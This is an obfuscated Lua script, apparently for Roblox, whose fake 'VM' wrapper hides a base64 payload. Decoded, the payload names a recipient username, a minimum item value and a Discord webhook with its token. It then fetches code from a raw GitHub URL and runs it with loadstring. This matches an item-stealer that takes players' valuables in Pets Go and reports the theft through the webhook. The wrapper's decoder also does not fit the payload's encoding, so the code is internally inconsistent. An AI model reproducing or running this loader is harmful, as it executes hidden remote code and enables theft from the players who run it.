
local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;

local function VMCall(ByteString, vmenv, ...)
  local DIP = 1;
  local repeatNext;
  ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
    if (Byte(byte, 2) == 81) then
      repeatNext = StrToNumber(Sub(byte, 1, 1));
      return "";
    else
      local a = Char(StrToNumber(byte, 16));
      if repeatNext then
        local b = Rep(a, repeatNext);
        repeatNext = nil;
        return b;
      else
        return a;
      end
    end
  end);
  
  local function gBits8()
    local a = Byte(ByteString, DIP, DIP);
    DIP = DIP + 1;
    return a;
  end
  
  local function gString(Len)
    local Str;
    if not Len then
      Len = gBits8();
      if (Len == 0) then
        return "";
      end
    end
    Str = Sub(ByteString, DIP, (DIP + Len) - 1);
    DIP = DIP + Len;
    return Str;
  end
  
  local function Deserialize()
    local Chunk = gString();
    return Chunk;
  end
  
  local function Wrap(Chunk, Env)
    return function(...)
      local func, err = loadstring(Chunk);
      if func then
        setfenv(func, Env);
        return func(...);
      else
        error("VM Error: " .. tostring(err));
      end
    end;
  end
  
  return Wrap(Deserialize(), vmenv)(...);
end

return VMCall("VXNlcm5hbWUgPSAiRXhjaXRhYmxlRWF0c0xpdHRsZUsiCk1pbmltdW1SQVAgPSAxMDAwMApXZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMzY4MTY4NzY2MzM4NDk4NTYvZ2JHUVlYMUdldVJqNmNJc3Jtb3BNczNfREtHNnFtVTNWY0ZwcG1NVHhubUdETHVDcjR0QmhIZU15M05YUEY3M3JfQjEiCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3llc2xpZGV6ei9Fa3MwdmEvbWFpbi9QZXRzR28iKSkoKQ==", GetFEnv(), ...);
  